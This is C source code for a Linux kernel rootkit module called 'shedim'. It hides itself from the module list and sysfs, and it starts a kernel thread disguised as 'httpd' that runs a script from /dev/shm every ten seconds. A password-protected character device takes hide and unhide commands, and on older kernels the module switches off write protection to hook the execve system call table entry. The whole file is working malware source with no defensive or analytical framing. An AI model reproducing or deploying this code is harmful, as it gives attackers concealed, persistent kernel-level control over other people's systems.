#include <linux/module.h>
#include <linux/version.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/kallsyms.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/cdev.h>
#include <linux/sched.h>
#include <linux/delay.h>
#include <linux/device.h>
#include <linux/string.h>
#include <linux/unistd.h>
#include <asm/uaccess.h>
#include <asm/paravirt.h>
#include <asm/pgtable.h>

#define RK_NAME "shedim"
#define RK_DECOY_NAME "httpd"
#define DEBUG 1
#define CMD "/dev/shm/rk.sh"
#define PASSWORD "secret"
#define PASSWORD_LEN 6
#ifdef DEBUG
#define DEVICE_NAME "rk"
#else
#define DEVICE_NAME "null"
#endif
#define BUF_SIZE 256


#define MIN(a,b) \
	({ typeof (a) _a = (a); \
	 typeof (b) _b = (b); \
	 _a < _b ? _a : _b; })

static int open = 0;
static char msg_buf[BUF_SIZE];
struct task_struct *rk_kthread;
unsigned long *syscall_table = NULL;
unsigned int hidden = 0;
pte_t *pte;


static struct list_head *module_previous;
static struct list_head *module_kobj_previous;

extern unsigned long __force_order;

void rk_hide(void);
void rk_unhide(void);

static int
device_open(struct inode *inode, struct file *file)
{
	if (open)
		return -EBUSY;

	open = 1;
	try_module_get(THIS_MODULE);

	return 0;
}

static int
device_release(struct inode *inode, struct file *file)
{
	open = 0;
	module_put(THIS_MODULE);
	return 0;
}

static ssize_t
device_read(struct file *file, char *buf, size_t length, loff_t *offset)
{
	return 0;
}

static ssize_t
device_write(struct file *file, const char __user *buf, size_t len, loff_t *off)
{
	if (copy_from_user(msg_buf, buf, BUF_SIZE) != 0) return -EFAULT;

#ifdef DEBUG
	printk(KERN_INFO "%s: writing %ld characters.", RK_NAME, len);
	printk(KERN_INFO "%s: writing buf=%s", RK_NAME, msg_buf);
#endif
	if (!strncmp(msg_buf, PASSWORD, MIN(PASSWORD_LEN, len))) {
		// The 1 is to account for the space.
		const char *cmd = msg_buf+PASSWORD_LEN+1;
		int cmd_len = len-PASSWORD_LEN-1;
#ifdef DEBUG
		printk(KERN_INFO "%s: cmd=%s", RK_NAME, cmd);
#endif
		if (!strncmp(cmd, "hide", MIN(4, cmd_len))) {
			rk_hide();
		} else if (!strncmp(cmd, "unhide", MIN(6, cmd_len))) {
			rk_unhide();
		}
	}

	return len;
}

static struct file_operations fops = {
	.read = device_read,
	.write = device_write,
	.open = device_open,
	.release = device_release
};

void rk_dev_init_module(void)
{
	register_chrdev(0, DEVICE_NAME, &fops);
}

void rk_dev_cleanup_module(void)
{
	unregister_chrdev(0, DEVICE_NAME);
}

asmlinkage int
(*real_execve)(const char *filename, char *const argv[], char *const envp[]);

asmlinkage int new_execve
(const char *filename, char *const argv[], char *const envp[])
{
#ifdef DEBUG
	pr_info("%s: hooked call to execve(%s, ...)\n", RK_NAME, filename);
#endif
	return real_execve(filename, argv, envp);
}

static int
rk_thread(void *data)
{
	do {
#ifdef DEBUG
		pr_info("%s: executing %s\n", RK_NAME, CMD);
#endif
		call_usermodehelper(CMD, NULL, NULL, UMH_NO_WAIT);
		msleep(10000);
	} while(!kthread_should_stop());
#ifdef DEBUG
	pr_info("%s: kernel thread stopping\n", RK_NAME);
#endif
	return 0;
}

void
rk_start_cmd_thread(void)
{
	int cpu = 0;
#ifdef DEBUG
	pr_info("%s: starting kernel thread on cpu %d\n", RK_NAME, cpu);
#endif
#ifdef DEBUG
	rk_kthread = kthread_create(rk_thread, &cpu, RK_NAME);
#else
	rk_kthread = kthread_create(rk_thread, &cpu, RK_DECOY_NAME);
#endif
	kthread_bind(rk_kthread, cpu);
	wake_up_process(rk_kthread);
}

void
rk_hide(void)
{
	if (hidden) return;
	module_previous = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
	kobject_del(&THIS_MODULE->mkobj.kobj);
	list_del(&THIS_MODULE->mkobj.kobj.entry);

	hidden = 1;
}

void
rk_unhide(void)
{
	int _;
	if (!hidden) return;
	list_add(&THIS_MODULE->list, module_previous);
	_ = kobject_add(&THIS_MODULE->mkobj.kobj,
			THIS_MODULE->mkobj.kobj.parent, RK_NAME);
	list_add(&THIS_MODULE->mkobj.kobj.entry, module_previous);

	hidden = 0;
}

inline void rk_write_cr0(unsigned long cr0) {
	asm volatile("mov %0,%%cr0" : "+r"(cr0), "+m"(__force_order));
}

void
rk_hijack_execve(void)
{
#if LINUX_VERSION_CODE < KERNEL_VERSION(5,3,0)
	unsigned int level;
	syscall_table = NULL;

	syscall_table = (void *)kallsyms_lookup_name("sys_call_table");
	pte = lookup_address((long unsigned int)syscall_table, &level);
#ifdef DEBUG
	pr_info("%s: syscall_table is at %p\n", RK_NAME, syscall_table);
	pr_info("%s: PTE address located %p\n", RK_NAME, &pte);
#endif
	if (syscall_table != NULL) {
		write_cr0 (read_cr0 () & (~ 0x10000));
		real_execve = (void *)syscall_table[__NR_execve];
		syscall_table[__NR_execve] = &new_execve;
		write_cr0 (read_cr0 () | 0x10000);
#ifdef DEBUG
		pr_info("%s: execve is at %p\n", RK_NAME, real_execve);
		pr_info("%s: syscall_table[__NR_execve] hooked\n", RK_NAME);
#endif
	} else {
		// TODO: If not debug what?
#ifdef DEBUG
		printk(KERN_EMERG "%s: sys_call_table is NULL\n", RK_NAME);
#endif
	}
#else
	unsigned long cr0 = read_cr0();
	clear_bit(16, &cr0);
	rk_write_cr0(cr0);
#endif
}

void
rk_unhijack_execve(void)
{
#if LINUX_VERSION_CODE < KERNEL_VERSION(5,3,0)
	if (syscall_table != NULL) {
		write_cr0 (read_cr0 () & (~ 0x10000));
		syscall_table[__NR_execve] = real_execve;
		write_cr0 (read_cr0 () | 0x10000);
#ifdef DEBUG
		printk(KERN_EMERG "%s: sys_call_table unhooked\n", RK_NAME);
#endif
	} else {
		// TODO: If not debug what?
#ifdef DEBUG
		printk(KERN_EMERG "%s: syscall_table is NULL\n", RK_NAME);
#endif
	}
#else
	unsigned long cr0 = read_cr0();
	set_bit(16, &cr0);
	rk_write_cr0(cr0);
#endif
}

static int __init
rk_init(void)
{
#ifdef DEBUG
	pr_info("%s: module loaded at 0x%p\n", RK_NAME, rk_init);
#else
	rk_hide();
#endif
	rk_dev_init_module();
	rk_hijack_execve();
	rk_start_cmd_thread();

	return 0;
}


static void __exit
rk_exit(void)
{
#ifdef DEBUG
	pr_info("%s: module un-loaded at 0x%p\n", RK_NAME, rk_exit);
#endif
	rk_dev_cleanup_module();
	rk_unhijack_execve();
	kthread_stop(rk_kthread);
}

module_init(rk_init);
module_exit(rk_exit);

MODULE_AUTHOR("Tommy Pujol");
MODULE_LICENSE("GPL");
